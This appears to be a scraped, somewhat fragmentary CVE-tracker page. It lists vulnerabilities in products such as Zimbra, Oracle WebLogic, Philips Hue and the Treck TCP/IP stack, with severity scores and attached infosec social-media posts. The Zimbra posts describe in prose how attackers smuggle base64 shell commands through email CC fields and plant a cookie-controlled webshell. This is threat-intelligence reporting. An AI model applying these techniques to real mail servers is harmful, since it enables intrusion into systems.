Notes: This vulnerability affects a common open-source component, third-party library, or a protocol used by different products. For more information, please see: https://github.com/gpac/gpac/commit/64a2e1b799352ac7d7aad1989bc06e7b0f2b01db ; https://nvd.nist.gov/vuln/detail/CVE-2021-4043
CVE URL: https://nvd.nist.gov/vuln/detail/CVE-2021-4043

##

CVE-2020-6007
(7.9 HIGH)

EPSS: 0.15%

updated 2023-03-01T03:00:19.090000

1 posts

Philips Hue Bridge model 2.X prior to and including version 1935144020 contains a Heap-based Buffer Overflow when handling a long ZCL string during the commissioning phase, resulting in a remote code execution.

david_chisnall@infosec.exchange at 2024-09-20T11:03:19.000Z ##

For those who missed SCI Semiconductor's demo at the Digital Security by Design (DSbD) all hands meeting this week, meet Hugh the Lightbulb! We introduced a memory safety bug in the TCP/IP stack similar to CVE-2023-48693 from Azure RTOS in December or the CVE-2020-6007 in Philips Hue lightbulbs. In other systems, these allowed remote arbitrary-code execution. We showed that, in a #CHERIoT system such as SCI's upcoming ICENI line, this becomes a couple of seconds of network disconnection with no impact on the rest of the system.

All of the code for Hugh is available for people to play with.

##

(7.3 HIGH)

updated 2023-02-14T18:30:21

3 posts

Multiple vulnerabilities in Cisco Small Business RV160, RV260, RV340, and RV345 Series Routers could allow an attacker to do any of the following: Execute arbitrary code Elevate privileges Execute arbitrary commands Bypass authentication and authorization protections Fetch and run unsigned software Cause denial of service (DoS) For more information about these vulnerabilities, see the Details sect

CVE-2020-14883

Easily exploitable vulnerability allows high privileged attacker with network access via HTTP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeove

screaminggoat at 2024-09-30T13:44:03.611Z ##

Sekoia: Hadooken and K4Spreader: The 8220 Gang's Latest Arsenal
Sekoia was able to capture the full attack chain of the Chinese origin cybercriminal 8220 Gang, from targeting CVE-2017-10271 and CVE-2020-14883 in Oracle Weblogic servers to deploy Python and Bash scripts, execute K4Spreader malware, which then delivered the Tsunami backdoor and a cryptominer. There are similarities with Aqua's blog post about Hadooken malware from 12 September 2024. Sekoia covers these different infection chains, the connections with the 8220 Gang, and the cross-references with the Hadooken case previously documented by Aqua. Indicators of compromise are listed on their GitHub repo.

References:

  • CVE-2017-10271 (7.5 high, disclosed 19 October 2017, in KEV) Oracle Corporation WebLogic Server Remote Code Execution Vulnerability
  • CVE-2020-14883 (7.2 high, disclosed 21 October 2020, in KEV) Oracle WebLogic Server Unspecified Vulnerability

#8220gang #cybercrime #cryptomining #CVE_2017_10271 #CVE_2020_14883 #vulnerability #eitw #oracle #weblogic #threatintel #infosec #cybersecurity #cyberthreatintelligence #CTI #IOC

##
screaminggoat@infosec.exchange at 2024-09-30T13:44:03.000Z ##

Sekoia: Hadooken and K4Spreader: The 8220 Gang's Latest Arsenal
Sekoia was able to capture the full attack chain of the Chinese origin cybercriminal 8220 Gang, from targeting CVE-2017-10271 and CVE-2020-14883 in Oracle Weblogic servers to deploy Python and Bash scripts, execute K4Spreader malware, which then delivered the Tsunami backdoor and a cryptominer. There are similarities with Aqua's blog post about Hadooken malware from 12 September 2024. Sekoia covers these different infection chains, the connections with the 8220 Gang, and the cross-references with the Hadooken case previously documented by Aqua. Indicators of compromise are listed on their GitHub repo.

References:

  • CVE-2017-10271 (7.5 high, disclosed 19 October 2017, in KEV) Oracle Corporation WebLogic Server Remote Code Execution Vulnerability
  • CVE-2020-14883 (7.2 high, disclosed 21 October 2020, in KEV) Oracle WebLogic Server Unspecified Vulnerability

#8220gang #cybercrime #cryptomining #CVE_2017_10271 #CVE_2020_14883 #vulnerability #eitw #oracle #weblogic #threatintel #infosec #cybersecurity #cyberthreatintelligence #CTI #IOC

CVE-2020-0601
(8.1 HIGH)

EPSS: 96.96%

updated 2022-08-12T18:40:31.113000

2 posts

A spoofing vulnerability exists in the way Windows CryptoAPI (Crypt32.dll) validates Elliptic Curve Cryptography (ECC) certificates.An attacker could exploit the vulnerability by using a spoofed code-signing certificate to sign a malicious executable, making it appear the file was from a trusted, legitimate source, aka 'Windows CryptoAPI Spoofing Vulnerability'.

  27. CVE-2021-46422

##

CVE-2020-11897
(10.0 CRITICAL)

EPSS: 1.41%

updated 2020-07-22T00:15:11.830000

1 posts

The Treck TCP/IP stack before 5.0.1.35 has an Out-of-Bounds Write via multiple malformed IPv6 packets.

1 repos

https://github.com/advanced-threat-research/Ripple-20-Detection-Logic

screaminggoat@infosec.exchange at 2024-09-19T14:55:41.000Z ##

CISA: CISA Releases Six Industrial Control Systems Advisories
Worth noting that Treck TCP/IP Stack (Update I) is on it's NINTH (9th) update, that IDEC Corporation is also vulnerable to a publicly disclosed set of Treck TCP/IP stack vulnerabilities known as Ripple20 (cc: @shellsharks), two of which CVE-2020-11896 and CVE-2020-11897 have perfect CVSSv3 10.0 critical scores 🥳 (cc: @cR0w)

#cisa #ics #vulnerability #CVE

updated 2020-06-09T18:52:09.567000

IBM WebSphere Application Server 8.5 and 9.0 traditional could allow a remote attacker to execute arbitrary code on the system with a specially-crafted sequence of serialized objects. IBM X-Force ID: 181231.

CVE-2018-18852
(8.8 HIGH)

EPSS: 0.11%

updated 2019-06-18T21:02:20.333000

1 posts

Cerio DT-300N 1.1.6 through 1.1.12 devices allow OS command injection because of improper input validation of the web-interface PING feature's use of Save.cgi to execute a ping command, as exploited in the wild in October 2018.

##

CVE-2024-45519
(0 None)

EPSS: 0.00%

22 posts

N/A

Nuclei template

1 repos

#search_error

gertvdijk@mastodon.social at 2024-10-02T11:37:49.000Z ##

'Patch yesterday': Zimbra mail servers under siege through RCE vulnerability #cve_2024_45519 #zimbra #security #infosec #email

"Attackers can, and evidently are, adding bogus CC addresses to emails that spoof Gmail. Instead of legitimate email addresses, CC fields are populated with base64 strings, which are then parsed and executed by Zimbra's mail servers."

https://www.theregister.com/2024/10/02/mass_exploitation_of_zimbra_rce/

##
screaminggoat at 2024-10-01T19:03:34.834Z ##

@threatinsight over at The Bad Place™: https://twitter.com/threatinsight/status/1841089939905134793

Beginning on September 28, @Proofpoint began observing attempts to exploit CVE-2024-45519, a remote code execution vulnerability in Zimbra mail servers.

The emails spoofing Gmail were sent to bogus addresses in the CC fields in an attempt for Zimbra servers to parse and execute them as commands. The addresses contained base64 strings that are executed with the sh utility.

For unknown reasons, the threat actor is using the same server to send the exploit emails and host second-stage payloads. The activity is unattributed at this time.

Some emails from the same sender used a series of CC'd addresses attempting to build a webshell on a vulnerable Zimbra server. The full CC list is wrapped as a string, and if the base64 blobs are concatenated, they decode to a command to write a webshell to /jetty/webapps/zimbraAdmin/public/jsp/zimbraConfig.jsp.

Once installed, the webshell listens for inbound connection with a pre-determined JSESSIONID Cookie field; if present, the webshell will then parse the JACTION cookie for base64 commands. The webshell has support for command execution via exec or download and execute a file over a socket connection.

cc: @justicerage @wdormann

#zimbra #vulnerability #CVE_2024_45519 #vulnerability #proofofconcept #eitw #activeexploitation

##
screaminggoat at 2024-10-01T18:46:25.174Z ##

Project Discovery: Zimbra - Remote Command Execution (CVE-2024-45519)
Reference: CVE-2024-45519 (score pending, unknown disclosure date) "Fixed a security vulnerability in the postjournal service which may allow unauthenticated users to execute commands"
Project Discovery provides a vulnerability analysis of CVE-2024-45519, which is said to be an unauthenticated remote command execution vulnerability in Zimbra Collaboration. They perform binary diffing to find the root cause: "The vulnerability stems from unsanitized user input being passed to popen in the unpatched version, enabling attackers to inject arbitrary commands." They provide a proof of concept.

Additionally, @justicerage warns of CVE-2024-45519 exploitation in the wild coming from 79.124.49[.]86 h/t: @wdormann

#zimbra #vulnerability #CVE_2024_45519 #vulnerability #proofofconcept #eitw #activeexploitation

##
jbhall56 at 2024-10-02T11:55:22.341Z ##

Enterprise security firm Proofpoint said it began observing the activity starting September 28, 2024. The attacks seek to exploit CVE-2024-45519, a severe security flaw in Zimbra's postjournal service that could enable unauthenticated attackers to execute arbitrary commands on affected installations. https://thehackernews.com/2024/10/researchers-sound-alarm-on-active.html
